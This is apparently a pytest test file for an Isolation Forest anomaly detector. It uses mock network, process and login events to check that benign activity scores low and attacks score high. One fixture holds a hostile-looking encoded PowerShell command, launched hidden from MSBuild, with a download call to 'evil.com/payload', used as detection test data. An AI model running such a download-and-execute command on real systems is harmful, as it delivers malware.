"""
Layer 2 — Isolation Forest Detector Tests

WHY THESE TESTS EXIST:
    Each test proves one specific concept
    about anomaly detection.

    We test three things:
    1. Feature extraction works correctly
    2. Anomaly scoring works correctly
    3. Training and inference pipeline works

WHAT WE ARE PROVING:
    - Normal events score LOW anomaly
    - Obvious attacks score HIGH anomaly
    - Model can be trained on synthetic data
    - Fallback rules work without training
    - All three event types supported
"""

import pytest
import numpy as np
from unittest.mock import MagicMock

from layer2_ml.anomaly.isolation_forest_detector import (
    IsolationForestDetector,
    AnomalyDetectionResult,
    extract_network_features,
    extract_process_features,
    extract_iam_features,
    generate_synthetic_normal_network,
    generate_synthetic_normal_process,
    _calculate_entropy
)


# ============================================================
# MOCK EVENT BUILDERS
#
# WHY MOCKS:
# We test the detector logic
# not the normalizer logic.
# Mocks give us controlled inputs
# so we know exactly what to expect.
# ============================================================

def make_normal_network_event():
    """
    Normal HTTPS web browsing event.
    Should score LOW anomaly.
    """
    network = MagicMock()
    network.fwd_bytes = 50000
    network.bwd_bytes = 200000
    network.fwd_packets = 100
    network.bwd_packets = 150
    network.duration_ms = 5000
    network.flow_bytes_per_sec = 50000
    network.fwd_packet_len_mean = 500
    network.bwd_packet_len_mean = 1333
    network.protocol = "TCP"

    destination = MagicMock()
    destination.port = 443
    destination.ip = "142.250.80.46"

    event = MagicMock()
    event.severity = 0
    event.category = "network"

    ecs = MagicMock()
    ecs.network = network
    ecs.destination = destination
    ecs.source = MagicMock()
    ecs.event = event
    ecs.process = None

    return ecs


def make_exfiltration_event():
    """
    Data exfiltration event.
    Very high outbound bytes.
    Should score HIGH anomaly.
    """
    network = MagicMock()
    network.fwd_bytes = 500_000_000  # 500MB outbound
    network.bwd_bytes = 1000
    network.fwd_packets = 350000
    network.bwd_packets = 10
    network.duration_ms = 60000
    network.flow_bytes_per_sec = 8_000_000
    network.fwd_packet_len_mean = 1428
    network.bwd_packet_len_mean = 100
    network.protocol = "TCP"

    destination = MagicMock()
    destination.port = 443
    destination.ip = "185.220.101.45"

    event = MagicMock()
    event.severity = 0
    event.category = "network"

    ecs = MagicMock()
    ecs.network = network
    ecs.destination = destination
    ecs.source = MagicMock()
    ecs.event = event
    ecs.process = None

    return ecs


def make_normal_process_event():
    """
    Normal notepad process.
    Short command, benign parent.
    Should score LOW anomaly.
    """
    parent = MagicMock()
    parent.name = "explorer.exe"

    process = MagicMock()
    process.name = "notepad.exe"
    process.command_line = "notepad.exe document.txt"
    process.parent = parent

    event = MagicMock()
    event.severity = 0
    event.category = "process"

    ecs = MagicMock()
    ecs.process = process
    ecs.event = event
    ecs.network = None
    ecs.destination = None

    return ecs


def make_malicious_process_event():
    """
    Encoded PowerShell from MSBuild.
    Long command, base64 encoding,
    suspicious parent.
    Should score HIGH anomaly.
    """
    parent = MagicMock()
    parent.name = "MSBuild.exe"

    process = MagicMock()
    process.name = "powershell.exe"
    process.command_line = (
        "powershell.exe -enc JABjAGwAaQBlAG4AdA"
        "== -WindowStyle Hidden -ExecutionPolicy"
        " Bypass -NoProfile -NonInteractive "
        "downloadstring http://evil.com/payload"
        " " * 200
    )
    process.parent = parent

    event = MagicMock()
    event.severity = 75
    event.category = "process"

    ecs = MagicMock()
    ecs.process = process
    ecs.event = event
    ecs.network = None
    ecs.destination = None

    return ecs


def make_normal_iam_event():
    """
    Normal authentication from known location.
    Should score LOW anomaly.
    """
    from layer1_ingestion.schema.iam_schema import (
        IamEvent, IamAuthEvent, GeoLocation, AuthContext
    )

    geo = GeoLocation(
        ip_address="10.0.0.155",
        country_code="US",
        country_name="United States",
        latitude=40.7128,
        longitude=-74.0060
    )

    auth = AuthContext(
        mfa_used=True,
        mfa_method="totp",
        outcome="success"
    )

    auth_event = IamAuthEvent(
        event_id="normal-001",
        event_time="2024-03-29T09:00:00Z",
        user_email="jsmith@corp.com",
        outcome="success",
        geo=geo,
        auth=auth,
        is_new_country=False,
        is_impossible_travel=False,
        is_new_device=False,
        risk_score=0.05
    )

    return IamEvent(
        event_type="auth",
        source_system="okta",
        user="jsmith@corp.com",
        auth_event=auth_event
    )


def make_anomalous_iam_event():
    """
    Impossible travel authentication.
    Should score HIGH anomaly.
    """
    from layer1_ingestion.schema.iam_schema import (
        IamEvent, IamAuthEvent, GeoLocation, AuthContext
    )

    geo = GeoLocation(
        ip_address="185.220.101.45",
        country_code="RO",
        country_name="Romania",
        latitude=44.4268,
        longitude=26.1025
    )

    auth = AuthContext(
        mfa_used=False,
        outcome="success"
    )

    auth_event = IamAuthEvent(
        event_id="anomaly-001",
        event_time="2024-03-29T09:14:00Z",
        user_email="jsmith@corp.com",
        outcome="success",
        geo=geo,
        auth=auth,
        is_new_country=True,
        is_impossible_travel=True,
        travel_distance_km=7650.0,
        travel_speed_kmh=14344.0,
        is_new_device=True,
        risk_score=0.85
    )

    return IamEvent(
        event_type="auth",
        source_system="okta",
        user="jsmith@corp.com",
        auth_event=auth_event
    )


# ============================================================
# TEST CLASS — FEATURE EXTRACTION
# ============================================================

class TestFeatureExtraction:
    """
    Tests for feature extraction functions.

    WHY THESE TESTS MATTER:
    Garbage in = garbage out.
    If feature extraction is wrong
    the model scores incorrectly
    even if the algorithm is perfect.
    """

    def test_network_features_shape(self):
        """
        Network feature vector has exactly 10 features.
        Shape must match training data shape
        or sklearn will throw an error.
        """
        event = make_normal_network_event()
        features = extract_network_features(event)

        assert features is not None
        assert len(features) == 10

    def test_network_features_no_negatives(self):
        """
        All network features must be non-negative.
        Isolation Forest does not require this
        but negative bytes make no physical sense.
        """
        event = make_normal_network_event()
        features = extract_network_features(event)

        assert features is not None
        # All raw count features should be >= 0
        for i in range(8):
            assert features[i] >= 0

    def test_process_features_shape(self):
        """Process feature vector has exactly 8 features"""
        event = make_normal_process_event()
        features = extract_process_features(event)

        assert features is not None
        assert len(features) == 8

    def test_base64_encoding_detected(self):
        """
        Base64 encoding flag set for
        encoded PowerShell command.

        This is the most common obfuscation
        technique used by malware.
        -enc flag = encoded command.
        """
        event = make_malicious_process_event()
        features = extract_process_features(event)

        assert features is not None
        # features[2] = has_base64
        assert features[2] == 1.0

    def test_download_function_detected(self):
        """
        Download function flag set when
        command contains web download calls.
        """
        event = make_malicious_process_event()
        features = extract_process_features(event)

        assert features is not None
        # features[3] = has_download
        assert features[3] == 1.0

    def test_parent_risk_set_for_msbuild(self):
        """
        MSBuild as parent process sets
        parent_risk flag to 1.0.
        MSBuild spawning PowerShell
        is a known Emotet delivery technique.
        """
        event = make_malicious_process_event()
        features = extract_process_features(event)

        assert features is not None
        # features[6] = parent_risk
        assert features[6] == 1.0

    def test_iam_features_shape(self):
        """IAM feature vector has exactly 8 features"""
        event = make_normal_iam_event()
        features = extract_iam_features(event)

        assert features is not None
        assert len(features) == 8

    def test_impossible_travel_feature_set(self):
        """
        Impossible travel flag set in
        feature vector for compromised auth.
        """
        event = make_anomalous_iam_event()
        features = extract_iam_features(event)

        assert features is not None
        # features[2] = is_impossible_travel
        assert features[2] == 1.0

    def test_none_event_returns_none(self):
        """None event returns None features gracefully"""
        result = extract_network_features(None)
        assert result is None

    def test_entropy_calculation(self):
        """
        Shannon entropy correctly calculated.

        Low entropy = predictable (normal names)
        High entropy = random (malware names)

        "aaa" = entropy 0 (all same character)
        "abc" = entropy > 0 (different characters)
        """
        low_entropy = _calculate_entropy("aaa")
        high_entropy = _calculate_entropy("xjf8k2mp")

        assert low_entropy == 0.0
        assert high_entropy > low_entropy


# ============================================================
# TEST CLASS — RULE BASED SCORING
# ============================================================

class TestRuleBasedScoring:
    """
    Tests for rule-based fallback scoring.

    WHY TEST FALLBACK:
    When no model is trained yet the platform
    must still produce useful scores.
    These tests prove the rules work correctly
    before any ML training happens.

    This is like testing your car's backup camera
    works even when the main navigation is off.
    """

    def setup_method(self):
        self.detector = IsolationForestDetector()

    def test_normal_network_scores_low(self):
        """
        Normal web traffic scores low anomaly.
        If normal traffic is flagged as anomalous
        analysts will be overwhelmed with false
        positives and stop trusting the system.
        """
        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert result is not None
        assert result.anomaly_score < 0.5

    def test_exfiltration_scores_high(self):
        """
        500MB outbound transfer scores HIGH anomaly.
        Data exfiltration is a dramatic anomaly.
        Isolation Forest excels at these.
        """
        event = make_exfiltration_event()
        result = self.detector.score_network(event)

        assert result is not None
        assert result.anomaly_score >= 0.3

    def test_normal_process_scores_low(self):
        """
        Notepad with short command scores low.
        Normal benign processes should not
        trigger the anomaly detector.
        """
        event = make_normal_process_event()
        result = self.detector.score_process(event)

        assert result is not None
        assert result.anomaly_score < 0.5

    def test_encoded_powershell_scores_high(self):
        """
        Encoded PowerShell from MSBuild
        scores HIGH anomaly.

        Three signals combine:
        - Base64 encoding present
        - Download function present
        - Suspicious parent (MSBuild)

        Each adds to the score.
        Combined they exceed threshold.
        """
        event = make_malicious_process_event()
        result = self.detector.score_process(event)

        assert result is not None
        assert result.anomaly_score >= 0.5
        assert result.is_anomaly is True

    def test_normal_iam_scores_low(self):
        """
        Normal MFA authentication scores low.
        Known user, known location, MFA used.
        Should not be flagged as anomalous.
        """
        event = make_normal_iam_event()
        result = self.detector.score_iam(event)

        assert result is not None
        assert result.anomaly_score < 0.5

    def test_impossible_travel_scores_high(self):
        """
        Impossible travel scores HIGH anomaly.
        7650km in 32 minutes is physically
        impossible therefore anomalous.
        """
        event = make_anomalous_iam_event()
        result = self.detector.score_iam(event)

        assert result is not None
        assert result.anomaly_score >= 0.5
        assert result.is_anomaly is True

    def test_anomaly_result_has_reasons(self):
        """
        Anomalous events have human-readable
        reasons explaining WHY they were flagged.

        Without reasons analysts cannot act.
        "This is anomalous" is not enough.
        "This is anomalous because 500MB
         outbound in 60 seconds" is actionable.
        """
        event = make_malicious_process_event()
        result = self.detector.score_process(event)

        assert len(result.risk_reasons) > 0

    def test_result_has_timestamp(self):
        """Every result has a timestamp"""
        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert result.scored_at != ""


# ============================================================
# TEST CLASS — ML MODEL TRAINING
# ============================================================

class TestMLModelTraining:
    """
    Tests for Isolation Forest ML training.

    WHY THESE TESTS:
    Training is the most critical step.
    If training fails silently the model
    falls back to rules but you do not know.
    These tests prove training actually worked.
    """

    def setup_method(self):
        self.detector = IsolationForestDetector(
            n_estimators=10,  # Fast for testing
            contamination=0.1
        )

    def test_network_model_trains_successfully(self):
        """
        Network model trains without error
        on synthetic normal traffic data.
        """
        training_data = (
            generate_synthetic_normal_network(100)
        )
        self.detector.train_network(training_data)

        assert self.detector.network_model is not None
        assert self.detector.network_trained_on == 100

    def test_process_model_trains_successfully(self):
        """Process model trains on synthetic data"""
        training_data = (
            generate_synthetic_normal_process(100)
        )
        self.detector.train_process(training_data)

        assert self.detector.process_model is not None
        assert self.detector.process_trained_on == 100

    def test_trained_model_scores_events(self):
        """
        After training the ML model scores events.
        This proves the full pipeline works:
        train → save → load → score.
        """
        training_data = (
            generate_synthetic_normal_network(100)
        )
        self.detector.train_network(training_data)

        event = make_normal_network_event()
        result = self.detector.score_network(event)

        assert result is not None
        assert 0.0 <= result.anomaly_score <= 1.0

    def test_insufficient_data_handled(self):
        """
        Training with fewer than 10 samples
        handled gracefully.
        Model should not be set if insufficient data.
        """
        tiny_data = np.random.rand(5, 10)
        self.detector.train_network(tiny_data)

        assert self.detector.network_model is None

    def test_statistics_tracked(self):
        """Training statistics correctly tracked"""
        training_data = (
            generate_synthetic_normal_network(100)
        )
        self.detector.train_network(training_data)

        stats = self.detector.get_statistics()
        assert stats["network_model_trained"] is True
        assert stats["network_trained_on"] == 100

    def test_anomaly_detection_counter(self):
        """Anomaly detection count increments"""
        event = make_malicious_process_event()
        initial = self.detector.anomalies_detected

        result = self.detector.score_process(event)

        if result.is_anomaly:
            assert (
                self.detector.anomalies_detected >
                initial
            )

    def test_synthetic_data_correct_shape(self):
        """
        Synthetic training data has correct shape.
        Network: (n_samples, 10)
        Process: (n_samples, 8)
        Shape must match feature extractor output.
        """
        network_data = (
            generate_synthetic_normal_network(100)
        )
        process_data = (
            generate_synthetic_normal_process(100)
        )

        assert network_data.shape == (100, 10)
        assert process_data.shape == (100, 8)